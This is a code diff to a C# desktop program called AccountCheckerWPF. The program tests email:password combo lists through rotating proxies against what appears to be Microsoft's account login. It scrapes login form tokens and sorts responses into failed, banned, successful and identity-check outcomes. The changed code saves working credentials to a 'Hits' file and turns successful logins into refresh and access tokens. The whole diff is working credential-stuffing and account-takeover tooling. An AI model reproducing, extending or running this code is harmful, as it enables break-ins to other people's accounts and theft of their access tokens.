@@ -22,11 +22,11 @@ namespace AccountCheckerWPF
         private int _fail = 0;
         private int _success = 0;
         private int _ban = 0;
-        private int _custom = 0;
+        private int _identity = 0;
         private int _unknown = 0;
         private ProxyManager _proxyManager = new ProxyManager();
         private ComboManager _comboManager = new ComboManager();
-        
+
         private IHttpServices _httpServices;
 
         public MainWindow()
@@ -156,7 +156,7 @@ namespace AccountCheckerWPF
                         }
 
                         Retry:
-                        
+
                         var email = account.Split(':')[0];
                         var password = account.Split(':')[1];
 
@@ -169,8 +169,6 @@ namespace AccountCheckerWPF
                             var contextid = ExtractValue(bodyGet, "contextid=", "&");
                             var uaid = ExtractValue(bodyGet, "uaid=", "\"/>");
                             var ppft = ExtractValue(bodyGet, "name=\"PPFT\" id=\"i0327\" value=\"", "\"");
-
-                            var postSuccess = false;
 
                             var postResponse =
                                 await _httpServices.SendPostRequestAsync(email, password, ppft, contextid, bk, uaid);
@@ -195,12 +193,10 @@ namespace AccountCheckerWPF
                                 bodyPost.Contains("/Abuse?mkt="))
                             {
                                 _fail++;
-                                goto Retry;
                             }
                             else if (bodyPost.Contains(",AC:null,urlFedConvertRename"))
                             {
                                 _ban++;
-                                goto Retry;
                             }
                             else if (bodyPost.Contains("sign in too many times"))
                             {
@@ -215,37 +211,67 @@ namespace AccountCheckerWPF
                                      bodyPost.Contains("privacynotice.account.microsoft.com"))
                             {
                                 _success++;
-                                postSuccess = true;
                             }
                             else if (bodyPost.Contains("identity/confirm?mkt") ||
                                      bodyPost.Contains("Email/Confirm?mkt"))
                             {
-                                _custom++;
-                                goto Retry;
+                                _identity++;
+                                var hitsDirectory = "Hits";
+                                var identityFilePath = Path.Combine(hitsDirectory, "identity.txt");
+
+                                if (!Directory.Exists(hitsDirectory))
+                                {
+                                    Directory.CreateDirectory(hitsDirectory);
+                                }
+
+                                if (!File.Exists(identityFilePath))
+                                {
+                                    try
+                                    {
+                                        File.Create(identityFilePath).Close();
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Console.WriteLine($"Error creating identity.txt: {ex.Message}");
+                                        return;
+                                    }
+                                }
+
+                                try
+                                {
+                                    await using (var file = new StreamWriter(identityFilePath, true))
+                                    {
+                                        await file.WriteLineAsync($"{email}:{password}");
+                                    }
+                                    
+                                    goto Complete;
+                                }
+                                catch (Exception ex)
+                                {
+                                    Console.WriteLine($"Error: {ex.Message}");
+                                    return;
+                                }
                             }
                             else
                             {
                                 _unknown++;
                                 goto Retry;
                             }
+                            
+                            var ci = GetCookieValue("MSPCID", cookies);
+                            var cid = ci?.ToUpper();
 
-                            if (postSuccess)
+                            var address = postResponse.RequestMessage.RequestUri.ToString();
+                            var refreshToken = ExtractValueBetween(address, "refresh_token=", "&");
+
+                            if (refreshToken != null)
                             {
-                                var ci = GetCookieValue("MSPCID", cookies);
-                                var cid = ci?.ToUpper();
-
-                                var address = postResponse.RequestMessage.RequestUri.ToString();
-                                var refreshToken = ExtractValueBetween(address, "refresh_token=", "&");
-
-                                if (refreshToken != null)
-                                {
-                                    var getAccessTokenResponse =
-                                        await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
-                                    var getAccessTokenResponseBody =
-                                        await getAccessTokenResponse.Content.ReadAsStringAsync();
-                                    var json = JObject.Parse(getAccessTokenResponseBody);
-                                    var accessToken = json["access_token"];
-                                }
+                                var getAccessTokenResponse =
+                                    await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
+                                var getAccessTokenResponseBody =
+                                    await getAccessTokenResponse.Content.ReadAsStringAsync();
+                                var json = JObject.Parse(getAccessTokenResponseBody);
+                                var accessToken = json["access_token"];
                             }
                         }
                         catch
